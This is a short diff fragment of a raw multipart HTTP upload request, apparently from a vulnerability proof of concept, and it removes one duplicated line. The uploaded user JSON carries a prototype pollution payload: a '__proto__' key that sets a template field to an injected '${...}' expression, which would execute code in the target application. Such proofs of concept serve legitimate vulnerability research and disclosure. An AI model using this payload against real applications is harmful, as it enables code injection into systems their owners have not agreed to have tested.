@@ -204,7 +204,6 @@ Content-Disposition: form-data; name="upload-users"; filename="testusers"
 Content-Type: application/octet-stream
 
 [{"username":"test1","lcUsername":"test1","password":"12","joinDate":"2026-04-23T14:17:15.653Z","licensePlate":"AAA111","img":"/images/profile.png", "__proto__":{"userAutoCreateTemplate":"${console.log('success') || '{}'}"}}]
-[{"username":"test1","lcUsername":"test1","password":"12","joinDate":"2026-04-23T14:17:15.653Z","licensePlate":"AAA111","img":"/images/profile.png", "__proto__":{"userAutoCreateTemplate":"${console.log('success') || '{}'}"}}]
 ------WebKitFormBoundaryFgVP8bepPyvfE2Ci--
 
 
